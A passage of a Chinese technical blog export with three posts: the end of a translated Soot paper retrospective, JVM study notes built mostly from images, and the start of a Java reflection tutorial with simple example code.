<p>我们的经验是，从总体上讲，Soot现在可以完成我们认为会做的事情。 Soot的一个意外应用是用于不完整和不完整的程序分析。 当我们最初设计Soot时，这种分析在研究界是未知的。 然而，在随后的12年中，它们已经变得非常流行。Soot可以毫无问题地进行这种分析。</p>
<h2 id="Difﬁculties"><a href="#Difﬁculties" class="headerlink" title="Difﬁculties"></a>Difﬁculties</h2><p>我们想强调两个困难：在外部更改存在的情况下保持Soot的最新状态，并鼓励Soot用户做出自己的更改。</p>
<p>自Soot最初发布以来，Java语言已经发生了重大变化。 Java 1.3是2000年Soot 1.0发行时的Java的最新版本，它不包括泛型，invokedynamic，注释或foreach循环以及其他更改。幸运的是，对虚拟机的更改受到了更大的限制。但是，对于Soot团队来说，要跟上Java虚拟机（用于字节码输入）的变化，尤其是Java语言（对于Java前端）的变化，是很难的。对于Soot Eclipse插件，对Eclipse的更改也已成为（更为严重的）问题。</p>
<p>尽管我们在本文中着重介绍了许多贡献性的变化，但我们希望合并来自非McGill用户的更多Soot贡献。鉴于其他人已经开发出了普遍关注的Soot扩展，这一点尤其正确。</p>
<h2 id="Ways-to-Improve"><a href="#Ways-to-Improve" class="headerlink" title="Ways to Improve"></a>Ways to Improve</h2><p>我们已经在第五节中讨论了特定于Soot的潜在改进。在本节中，我们讨论了改进编译器框架的想法，我们认为这对更广泛的社区感兴趣。</p>
<p>我们认为，有许多原因导致Soot扩展无法重新合并到主要的Soot代码中。首先，应该设计编译器框架，以使其更容易独立发布框架扩展。尽管Eclipse插件系统对于研究编译器可能不必要地复杂，但是拥有一个简单的扩展系统可能仍然有用。由于我们当时还没有想到这个问题，因此在该领域Soot可能会得到很大改善。其次，发布软件既费时又无益。在评估论文时，会议应更加重视软件和数据发布；它们是科学过程中不可或缺的一部分。一些会议，例如ESEC / FSE，开始鼓励与论文一起发布更完整的信息，我们对此趋势表示赞赏。</p>
<p>我们还注意到很难发布框架文件。没有真正的参考文献将Soot描述为系统。我们鼓励会议接受更多的框架文件。</p>
<p>从更高的技术水平来看，Soot在两次通过之间重新计算了很多数据。它必须重新计算数据，因为它不知道有多少数据因中间计算而无效。增量或反应式计算将有助于提高编译器框架的性能。</p>
<h2 id="Reasons-for-Success"><a href="#Reasons-for-Success" class="headerlink" title="Reasons for Success"></a>Reasons for Success</h2><p>我们相信Soot之所以成功，是因为它在正确的时间提供了正确的功能并且易于使用。 我们在第二节中讨论了Soot的功能。 最重要的功能包括：1）Soot对Java的支持； 2）方便的Jimple中间表示； 和3）Spark指针分析工具包。 指针分析特别重要，因为对Java代码的大多数非平凡的分析必须合理地说明指针的行为。 任何编译器框架都将很难使用，但在有足够的决心的情况下，似乎Soot足够可用。 易用性还包括Soot的软件许可，每晚构建和准备偶尔发布的Soot版本（包含来自社区的补丁程序）以及Soot邮件列表中的响应能力。</p>
<h2 id="Acknowledgment"><a href="#Acknowledgment" class="headerlink" title="Acknowledgment"></a>Acknowledgment</h2><p>致谢。<br>Soot的开发得到了加拿大自然科学与工程研究委员会，魁北克自然与技术基金会，IBM高级研究中心以及Eclipse创新资助的部分支持。 Eric Bodden得到CASED（<a href="http://www.cased.de）的支持。" target="_blank" rel="noopener">www.cased.de）的支持。</a></p>
<p>我们要感谢为Soot的开发提供帮助的所有贡献者，并特别感谢Raja Vall´ee-Rai在Soot方面的开拓性工作。</p>
]]></content>
      <categories>
        <category>Papers</category>
      </categories>
      <tags>
        <tag>Soot</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM梳理</title>
    <url>/JVM%E6%A2%B3%E7%90%86/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>岁月悠悠，衰微只及肌肤；热忱抛却，颓唐必致灵魂</p>
</blockquote>
<p>今天来总结一下JVM。</p>
<a id="more"></a>

<h1 id="JVM的整体结构"><a href="#JVM的整体结构" class="headerlink" title="JVM的整体结构"></a>JVM的整体结构</h1><p>JDK：JVM + 基础类库 + 编译工具；</p>
<p>JRE：JVM + 基础类库；</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418145902839.png" alt="image-20200418145902839"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155204290.png" alt="image-20200418155204290"></p>
<p>说明：</p>
<ol>
<li>线程私有：虚拟机栈，本地方法栈，程序计数器；</li>
<li>线程共享：堆，方法区；</li>
<li>执行引擎：解释器（Interpreter）、JIT（即时编译器，编译器后端）、GC（垃圾回收器）；</li>
<li>JVM直接和操作系统对话；</li>
<li>先经过类加载器，类信息放在方法区中，类的实例对象放在堆中；</li>
<li>解释器逐行解释代码，翻译成机器码；</li>
</ol>
<h1 id="Java代码执行流程"><a href="#Java代码执行流程" class="headerlink" title="Java代码执行流程"></a>Java代码执行流程</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418151219263.png" alt="image-20200418151219263"></p>
<h1 id="JVM的架构模型"><a href="#JVM的架构模型" class="headerlink" title="JVM的架构模型"></a>JVM的架构模型</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418151623527.png" alt="image-20200418151623527"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418151703860.png" alt="image-20200418151703860"></p>
<h1 id="JVM的生命周期"><a href="#JVM的生命周期" class="headerlink" title="JVM的生命周期"></a>JVM的生命周期</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418154808045.png" alt="image-20200418154808045"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155021200.png" alt="image-20200418155021200"></p>
<p>说明：</p>
<ol>
<li><code>jps</code>查看JVM进程</li>
</ol>
<h1 id="类加载子系统"><a href="#类加载子系统" class="headerlink" title="类加载子系统"></a>类加载子系统</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155255836.png" alt="image-20200418155255836"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155548287.png" alt="image-20200418155548287"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155604895.png" alt="image-20200418155604895"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155641028.png" alt="image-20200418155641028"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418160000057.png" alt="image-20200418160000057"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418160516538.png" alt="image-20200418160516538"></p>
<ol>
<li><p>加载：</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418160817268.png" alt="image-20200418160817268"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418161024792.png" alt="image-20200418161024792"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419153054534.png" alt="image-20200419153054534"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419153129167.png" alt="image-20200419153129167"></p>
<p>讲图：</p>
<p>instanceKlass相当于一种数据结构；</p>
<p>堆中存放Person.class的类对象，这个类对象有instanceKlass的内存地址</p>
<p>instanceKlass也存放着Person类对象的内存地址；</p>
</li>
</ol>
<p>   对于Person的实例化对象来说，对象头部存放Person类对象地址；</p>
<p>   那么就会先去找class类对象，再间接去元空间去找instanceKlass对象，再之后就会去元空间里面找<code>_Methods,_fields</code>，去调用对象方法。</p>
<ol start="2">
<li><p>链接：</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418161125751.png" alt="image-20200418161125751"></p>
<p>验证：</p>
<ol>
<li><p>文件格式验证：0xCAFEBABE</p>
</li>
<li><p>元数据验证：对字节码描述的信息进行语义分析</p>
</li>
<li><p>字节码验证：最复杂</p>
<p>通过数据流分析和控制流分析，确定程序是合法的，符合逻辑的</p>
</li>
<li><p>符号饮用验证：确保解析行为可以正常运行</p>
</li>
</ol>
<p>准备：</p>
<ol>
<li>对于final，static：<ol>
<li>基本类型会直接给值</li>
<li>包装类就会先0再赋值</li>
</ol>
</li>
<li>在JDK7之后，静态变量的内存不再方法区内，会跟着类对象存储在堆中。</li>
<li>常量也会在准备阶段被赋值；</li>
</ol>
<p>解析：其实就是<code>#1-&gt;内存指针</code>的过程；</p>
</li>
<li><p>初始化：</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418161953621.png" alt="image-20200418161953621"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418162523130.png" alt="image-20200418162523130"></p>
<p>讲图：</p>
<p><clinit>（）就是给类变量赋值；</clinit></p>
<p>类一旦被初始化，那么static{}代码块就会执行；</p>
</li>
</ol>
<h2 id="类加载器分类"><a href="#类加载器分类" class="headerlink" title="类加载器分类"></a>类加载器分类</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418163927620.png" alt="image-20200418163927620"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418164007063.png" alt="image-20200418164007063"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418165041003.png" alt="image-20200418165041003"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418165056893.png" alt="image-20200418165056893"></p>
<h3 id="启动类加载器"><a href="#启动类加载器" class="headerlink" title="启动类加载器"></a>启动类加载器</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418165134118.png" alt="image-20200418165134118"></p>
<h3 id="扩展类加载器"><a href="#扩展类加载器" class="headerlink" title="扩展类加载器"></a>扩展类加载器</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418170248971.png" alt="image-20200418170248971"></p>
<h3 id="应用程序类加载器"><a href="#应用程序类加载器" class="headerlink" title="应用程序类加载器"></a>应用程序类加载器</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418170341262.png" alt="image-20200418170341262"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418170745232.png" alt="image-20200418170745232"></p>
<h3 id="用户自定义类加载器"><a href="#用户自定义类加载器" class="headerlink" title="用户自定义类加载器"></a>用户自定义类加载器</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418170831894.png" alt="image-20200418170831894"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418171054380.png" alt="image-20200418171054380"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418171316057.png" alt="image-20200418171316057"></p>
<h2 id="关于ClassLoader"><a href="#关于ClassLoader" class="headerlink" title="关于ClassLoader"></a>关于ClassLoader</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418171426186.png" alt="image-20200418171426186"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418172845950.png" alt="image-20200418172845950"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418173249965.png" alt="image-20200418173249965"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418173527886.png" alt></p>
<h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418173924676.png" alt="image-20200418173924676"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418174739320.png" alt="image-20200418174739320"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418180901719.png" alt="image-20200418180901719"></p>
<h2 id="沙箱安全机制"><a href="#沙箱安全机制" class="headerlink" title="沙箱安全机制"></a>沙箱安全机制</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418180935740.png" alt="image-20200418180935740"></p>
<h2 id="类的主动使用和被动使用"><a href="#类的主动使用和被动使用" class="headerlink" title="类的主动使用和被动使用"></a>类的主动使用和被动使用</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418181420103.png" alt="image-20200418181420103"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418185356560.png" alt="image-20200418185356560"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418185453190.png" alt="image-20200418185453190"></p>
<h1 id="运行时数据区"><a href="#运行时数据区" class="headerlink" title="运行时数据区"></a>运行时数据区</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418185723067.png" alt="image-20200418185723067"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418192817976.png" alt="image-20200418192817976"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418193138847.png" alt="image-20200418193138847"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418194740732.png" alt="image-20200418194740732"></p>
<h2 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418195102631.png" alt="image-20200418195102631"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418195246131.png" alt="image-20200418195246131"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418195504014.png" alt="image-20200418195504014"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418195628415.png" alt="image-20200418195628415"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418200332016.png" alt="image-20200418200332016"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418200413151.png" alt="image-20200418200413151"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418200450509.png" alt="image-20200418200450509"></p>
<p>说明：</p>
<p>并行是时刻，并发是时间段；</p>
<p>并行是同时执行，并发是一个时间片内交替执行；</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418203821322.png" alt="image-20200418203821322"></p>
<h2 id="虚拟机栈"><a href="#虚拟机栈" class="headerlink" title="虚拟机栈"></a>虚拟机栈</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418203923749.png" alt="image-20200418203923749"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418204014794.png" alt="image-20200418204014794"></p>
<p>说明：</p>
<p>栈空间也可以存放堆中对象的引用值；</p>
<p>栈：每个【线程】运行时需要的内存空间，每个线程只能有一个活动栈桢；</p>
<p>栈桢：每个【方法】运行时需要的内存空间：</p>
<p>​            局部变量表/操作数栈/动态链接/返回地址</p>
<p>活动栈桢：对应着当前正在执行的方法，往往在栈顶部；</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205038016.png" alt="image-20200418205038016"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205108066.png" alt="image-20200418205108066"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205237524.png" alt="image-20200418205237524"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205309508.png" alt="image-20200418205309508"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205413293.png" alt="image-20200418205413293"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205716022.png" alt="image-20200418205716022"></p>
<h3 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205949373.png" alt="image-20200418205949373"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418210220163.png" alt="image-20200418210220163"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418210905110.png" alt="image-20200418210905110"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418211004395.png" alt="image-20200418211004395"></p>
<p>说明：静态方法是不允许使用this关键字的</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418211757994.png" alt="image-20200418211757994"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418212132545.png" alt="image-20200418212132545"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418212227111.png" alt="image-20200418212227111"></p>
<h3 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h3><p>它是由数组实现的</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418212650692.png" alt="image-20200418212650692"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418212759619.png" alt="image-20200418212759619"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418213405170.png" alt="image-20200418213405170"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418213538778.png" alt="image-20200418213538778"></p>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418213646147.png" alt="image-20200418213646147"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418213849929.png" alt="image-20200418213849929"></p>
<h3 id="栈顶缓存技术"><a href="#栈顶缓存技术" class="headerlink" title="栈顶缓存技术"></a>栈顶缓存技术</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418214034973.png" alt="image-20200418214034973"></p>
<h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418214152093.png" alt="image-20200418214152093"></p>
<p>运行时常量池在方法区中；</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419130449081.png" alt="image-20200419130449081"></p>
<h3 id="方法的调用"><a href="#方法的调用" class="headerlink" title="方法的调用"></a>方法的调用</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419130630076.png" alt="image-20200419130630076"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419132125397.png" alt="image-20200419132125397"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419132917680.png" alt="image-20200419132917680"></p>
<h3 id="虚方法和非虚方法"><a href="#虚方法和非虚方法" class="headerlink" title="虚方法和非虚方法"></a>虚方法和非虚方法</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419133028099.png" alt="image-20200419133028099"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419134117873.png" alt="image-20200419134117873"></p>
<p>this/super基本上都是非虚方法，在编译期间就可以确定</p>
<p>invokestatic/invokespecial</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419140113762.png" alt="image-20200419140113762"></p>
<p>如果隐式调用父类的final方法（也就是不加super.），是invokevirtual</p>
<p>但如果super.的方式，则是invokespecial</p>
<p>子类重写也是invokevirtual</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419150151752.png" alt="image-20200419150151752"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419150436945.png" alt="image-20200419150436945"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419151113451.png" alt="image-20200419151113451"></p>
<h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419151335851.png" alt="image-20200419151335851"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419151451292.png" alt="image-20200419151451292"></p>
<h3 id="方法返回地址"><a href="#方法返回地址" class="headerlink" title="方法返回地址"></a>方法返回地址</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419151808852.png" alt="image-20200419151808852"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152042892.png" alt="image-20200419152042892"></p>
<h2 id="本地方法接口"><a href="#本地方法接口" class="headerlink" title="本地方法接口"></a>本地方法接口</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152319866.png" alt="image-20200419152319866"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152355798.png" alt="image-20200419152355798"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152450717.png" alt="image-20200419152450717"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152549409.png" alt="image-20200419152549409"></p>
<h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152635383.png" alt="image-20200419152635383"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152713001.png" alt="image-20200419152713001"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152747720.png" alt="image-20200419152747720"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>漫谈Java反射</title>
    <url>/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>今天来总结一下Java反射，在它面前，任何事物没有任何隐私。</p>
<a id="more"></a>

<h1 id="什么是Java反射？"><a href="#什么是Java反射？" class="headerlink" title="什么是Java反射？"></a>什么是Java反射？</h1><blockquote>
<p>将类的各个组成部分封装为其他对象，这就是反射机制。</p>
</blockquote>
<p>Java中的反射机制是指<strong>在运行状态中</strong>，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。</p>
<p><strong><em>让Java可以在运行时，根据传入的类名字符串，去执行这个类存在的方法。</em></strong></p>
<p>举个例子，Java代码在计算机中经历的三个阶段：</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200411205831842.png" alt="image-20200411205831842"></p>
<ul>
<li><p>source源代码阶段：此时刚刚编译为字节码，仍然保存在硬盘上。</p>
</li>
<li><p>Class类对象阶段：类加载器把Person.class字节码加载进内存。</p>
<p>对于java来说，万物皆对象，那么这时内存里会有一个Person这个类的类对象，也就是<strong>Class类对象</strong>，这个东西就很抽象。</p>
<blockquote>
<p>在Java里面有个类叫做<strong>Class</strong>，它是来描述<strong><em>所有字节码物理文件的一些共同特征和行为</em></strong>。例如成员变量，构造方法，普通的成员方法。</p>
<p>Class类对象会对重点内容进行封装成成员变量：</p>
<p>成员变量 ——-&gt; Field对象，Field[] fields</p>
<p>构造方法 ——-&gt; Constructor对象，Constructor[] cons</p>
<p>成员方法 ——-&gt; Method对象，Method[] methods</p>
</blockquote>
</li>
<li><p>运行时阶段：这个时候类对象已经实例化成为了一个对象</p>
</li>
</ul>
<p>好处：</p>
<ol>
<li>可以在程序<strong>运行过程中</strong>，操作对象。例如：获取，设置</li>
<li>可以降低程序耦合性，提高程序的扩展性</li>
</ol>
<h2 id="如何获取Class类对象？"><a href="#如何获取Class类对象？" class="headerlink" title="如何获取Class类对象？"></a>如何获取Class类对象？</h2><h3 id="字节码文件阶段"><a href="#字节码文件阶段" class="headerlink" title="字节码文件阶段"></a>字节码文件阶段</h3><blockquote>
<p>Class.forname(“全类名”)//包名.类名</p>
</blockquote>
<p>将字节码文件加载进内存 返回Class类对象</p>
<h3 id="内存阶段"><a href="#内存阶段" class="headerlink" title="内存阶段"></a>内存阶段</h3><blockquote>
<p>类名.class</p>
</blockquote>
<p>当class字节码加载进内存，那么这个Class类对象就有一个<strong>类名</strong>属性，可以用来索引</p>
<h3 id="运行时阶段"><a href="#运行时阶段" class="headerlink" title="运行时阶段"></a>运行时阶段</h3><blockquote>
<p>对象.getClass()</p>
</blockquote>
<p>所有对象的父类都是Object类，这个类有自己的getClass方法，所有对象都可以拿来用</p>
<h2 id="实例demo"><a href="#实例demo" class="headerlink" title="实例demo"></a>实例demo</h2><h3 id="字节码阶段"><a href="#字节码阶段" class="headerlink" title="字节码阶段"></a>字节码阶段</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Class.forName("全类名")</span></span><br><span class="line">Class cls1 = Class.forName(<span class="string">"domain.Person"</span>);</span><br><span class="line">System.out.println(cls1);</span><br></pre></td></tr></table></figure>

<h3 id="内存阶段-1"><a href="#内存阶段-1" class="headerlink" title="内存阶段"></a>内存阶段</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类名.class属性</span></span><br><span class="line">Class cls2 = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">System.out.println(cls2);</span><br></pre></td></tr></table></figure>

<h3 id="运行时阶段-1"><a href="#运行时阶段-1" class="headerlink" title="运行时阶段"></a>运行时阶段</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对象.getClass()方法</span></span><br><span class="line">Person p = <span class="keyword">new</span> Person();</span><br><span class="line">Class cls3 = p.getClass();</span><br><span class="line">System.out.println(cls3);</span><br></pre></td></tr></table></figure>

<h3 id="小细节"><a href="#小细节" class="headerlink" title="小细节"></a>小细节</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用==去比较三个class类对象，==比较的是对象的内存地址，如果内存地址相同，那么就是同一个对象</span></span><br><span class="line">System.out.println(cls1 == cls2);<span class="comment">//true</span></span><br><span class="line">System.out.println(cls1 == cls3);<span class="comment">//true</span></span><br><span class="line"><span class="comment">//结论：同一个字节码文件（xx.class）在一次程序运行的过程中，只会被加载一次</span></span><br><span class="line"><span class="comment">//不论是哪种方式获取的Class类对象，都是同一个。</span></span><br></pre></td></tr></table></figure>

<h1 id="实例对照"><a href="#实例对照" class="headerlink" title="实例对照"></a>实例对照</h1><p>下面看一个demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">  	<span class="comment">//public String a;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"eat..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">(String food)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"eat..."</span>+food);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取Fields"><a href="#获取Fields" class="headerlink" title="获取Fields"></a>获取Fields</h2><blockquote>
<p> 获取成员变量们：</p>
<ul>
<li>Fields[] getFields()：只获取所有public修饰的成员变量</li>
<li>Fields[] getField(String name)：获取所有public修饰的成员变量</li>
<li>Fields[] getDeclaredFields()：获取所有的成员变量，【不考虑】修饰符</li>
<li>Fields[] getField(String name)：获取特定的成员变量</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"><span class="comment">//Fields[] getFields()：只会获取全部的【public修饰】的成员变量</span></span><br><span class="line">Field[] fields = personClass.getFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    <span class="comment">//由于都是private，什么都不输出</span></span><br><span class="line">    System.out.println(field);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

